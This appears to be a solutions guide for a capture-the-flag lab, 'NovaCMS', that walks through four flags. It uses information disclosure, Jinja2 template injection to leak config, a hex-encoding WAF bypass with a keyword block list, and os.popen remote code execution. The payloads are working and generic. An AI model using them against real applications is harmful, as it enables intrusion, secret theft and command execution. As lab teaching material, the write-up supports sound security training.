# CTF 5: NovaCMS -- Solutions

## Player Onboarding

On first login, the dashboard shows a dismissible onboarding banner:
- **4 flags** to find
- Flag format: `durham-cms-flagN{...}` (N = 1–4)
- Difficulty tiers: **Recon** (Flag 1) → **Exploit** (Flags 2 & 3) → **RCE** (Flag 4)

The banner disappears after clicking "Got it" and does not reappear within the same session.

---

## Credentials

- `abcd12` / *(see credentials.json)*
- `efgh34` / *(see credentials.json)*
- `ijkl56` / *(see credentials.json)*

---

## Flag 1: Information Disclosure

### Discovery Path

Multiple breadcrumb chains lead here:

**Chain A (page source):**
1. Login -- view page source on any page. The `<head>` contains:
   ```html
   <!-- NovaCMS v2.1.0-beta | internal API: /health -->
   ```
2. Visit `/health`:
   ```json
   {
     "app": "NovaCMS",
     "version": "2.1.0-internal",
     "engine": "jinja2",
     "status": "running",
     "note": "Debug endpoints require X-Debug-Token header",
     "config_note": "SECRET_KEY rotation pending -- current key may be a flag",
     "changelog": "/static/CHANGELOG.md"
   }
   ```
3. `note` hints at a debug token. `config_note` is a breadcrumb for Flag 2. `changelog` leads to the WAF keyword list for Flag 3.

**Chain B (login page source):**
1. View source on the login page -- find:
   ```html
   <!-- Auth endpoint hardened Q3 2024 -- see /health for service status -->
   ```
2. Follow to `/health` as above.

**Chain C (editor source):**
1. Navigate to the editor -- view source -- find:
   ```html
   <!-- Debug: /api/status with X-Debug-Token: novacms-internal -->
   ```
   This directly reveals the token and endpoint.

**Chain D (dashboard source):**
1. View source on the dashboard -- find:
   ```html
   <!-- Dashboard v2 | debug endpoints still active (see /api/*) -->
   ```

### Exploit

```bash
curl -H "X-Debug-Token: novacms-internal" http://localhost:5175/api/status
```

**Response:**
```json
{
  "flag": "durham-cms-flag1{<flag1_value>}",
  "debug": true
}
```

**Flag 1:** `durham-cms-flag1{...}` *(per-user, see flags.json)*

---

## Flag 2: Basic SSTI -- Config Leak

### Discovery Path

1. From Flag 1, the `/health` response confirms the engine is `jinja2` and hints `config_note: "SECRET_KEY rotation pending -- current key may be a flag"`.
2. The editor has a "Live Preview" feature. The toggle shows **Legacy Preview (v1 — deprecated)** / **Production Preview (v2 — WAF-protected)**, pushing toward v1 for initial exploration.
3. Editor source contains:
   ```html
   <!-- TODO: sanitise preview input before Jinja render -->
   <!-- Note: app SECRET_KEY is the CMS master credential -- flag2 -->
   ```
4. CHANGELOG (`/static/CHANGELOG.md`, linked from the page footer and `/health`) has:
   ```
   [SECURITY] Rotated SECRET_KEY. Old value was being used as internal auth token (flag2).
   ```

### Exploit

1. Go to the post editor. Ensure the **v1 (Legacy)** toggle is selected (unchecked).
2. Type `{{7*7}}` and click Preview → output shows `49`, confirming SSTI.
3. Type `{{config}}` and click Preview.
4. The output contains the full Flask config including:
   ```
   SECRET_KEY: novacms-dev-2024
   ```
5. The editor source and CHANGELOG both confirm this is the flag.

> Note: after 5 uses of v1, a deprecation notice appears in the preview output nudging toward v2.

**Flag 2:** `durham-cms-flag2{novacms-dev-2024}` *(static -- the SECRET_KEY itself)*

---

## Flag 3: WAF Bypass

### Discovery Path

1. The editor toggle labels v2 as **Production Preview (WAF-protected)**. After 5 v1 uses, a deprecation notice pushes players to v2.
2. Switch to v2, try `{{config}}` → "Blocked: input contains forbidden keyword 'config'". The error response also says:
   > *"Blocked keywords listed in /static/CHANGELOG.md. Hex encoding (\x5f\x5f) can represent blocked characters."*
3. Visit `/static/CHANGELOG.md` -- discoverable via:
   - Footer link on every page (`v2.1.0-beta`)
   - `/health` JSON: `"changelog": "/static/CHANGELOG.md"`
   - Editor source: `<!-- See /static/CHANGELOG.md for WAF update notes -->`
4. CHANGELOG lists blocked keywords: `__`, `config`, `os`, `class`, `subclasses`, `request`, `import`, `popen`, `system`, `eval`, `exec`, `builtins`

### Bypass Techniques

**Hex encoding** replaces `__` with `\x5f\x5f` to bypass the literal substring check:
```
# Access config via attr filter with hex-encoded dunders:
{{self|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')}}
```

**Using `|attr()` filter** to avoid dot notation with blocked words:
```
# Instead of: ''.__class__
# Use:        ''|attr('\x5f\x5fclass\x5f\x5f')
```

### Exploit

**Step 1: Confirm WAF bypass works** -- dump Jinja2 globals via hex-encoded dunders:

```
{{self|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')}}
```

**Step 2: Access `os.environ` through the WAF bypass** -- import `os`, dump environment variables:

```
{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x69mport\x5f\x5f')('\x6f\x73')|attr('environ')}}
```

The output contains `WAF_FLAG3: durham-cms-flag3{...}`.

Note: Flag 3 is stored in `os.environ['WAF_FLAG3']` — it does **not** appear in `{{config}}` on the unfiltered v1 endpoint. Players must use the WAF bypass to reach it.

**Hex encoding key:** `__` -> `\x5f\x5f`, `builtins` -> `\x62uiltins`, `import` -> `\x69mport`, `os` -> `\x6f\x73`

**Flag 3:** `durham-cms-flag3{...}` *(per-user, stored in `os.environ['WAF_FLAG3']`, see flags.json)*

---

## Flag 4: Remote Code Execution

### Discovery Path

1. With WAF bypass mastered from Flag 3, escalate to command execution.
2. Multiple hints point toward `os.popen()` and `/app/secret/`:
   - **Editor source**: `<!-- SECURITY: template sandbox does NOT prevent os.popen() -- see /app/secret/ for sensitive files -->`
   - **CHANGELOG**: `[TODO] Audit popen/system calls in template sandbox` and `Flag files relocated to /app/secret/`
   - **WAF block response**: hints at hex encoding for blocked chars
   - **"Internal: Security Audit Notes" blog post** (visible to authenticated users): *"Audit finding: Jinja2 sandbox does not restrict os.popen() or subprocess calls. Sensitive files under /app/secret/ must be protected at the OS level."*
3. Goal: `cat /app/secret/flag.txt`

### Exploit

Using the `lipsum` globals path with hex encoding to bypass the WAF.

**Verified payload** -- all blocked keywords hex-encoded (`import` -> `\x69mport`, `os` -> `\x6f\x73`, `popen` -> `p\x6fpen`, `builtins` -> `\x62uiltins`):

```
{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x69mport\x5f\x5f')('\x6f\x73')|attr('p\x6fpen')('cat /app/secret/flag.txt')|attr('read')()}}
```

This returns the contents of `/app/secret/flag.txt`.

**Alternative: Full MRO chain:**
```
# Enumerate subclasses to find subprocess.Popen or os._wrap_close
{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|last|attr('\x5f\x5fsubcla'+'sses\x5f\x5f')()}}
```

**Flag 4:** `durham-cms-flag4{...}` *(per-user, see flags.json)*

---

## Summary

| Flag | Technique | Difficulty | OWASP |
|------|-----------|------------|-------|
| 1 | Information disclosure (source + hidden API) | Beginner | A05, A01 |
| 2 | Basic SSTI -- `{{config}}` leak | Intermediate | A03, A02 |
| 3 | SSTI WAF bypass (hex encoding + attr filter) | Advanced Intermediate | A03 |
| 4 | RCE via MRO chain / lipsum globals | Advanced | A03 |

## Key Vulnerabilities

1. **Security Misconfiguration**: Debug endpoints and HTML comments left in production
2. **Injection (SSTI)**: User input passed directly to `render_template_string()`
3. **Cryptographic Failure**: SECRET_KEY hardcoded as a weak, guessable value
4. **Broken Access Control**: Hidden API route protected only by a predictable header token
5. **WAF Bypass**: Keyword blocklist defeated by hex encoding and Jinja2 filter chaining
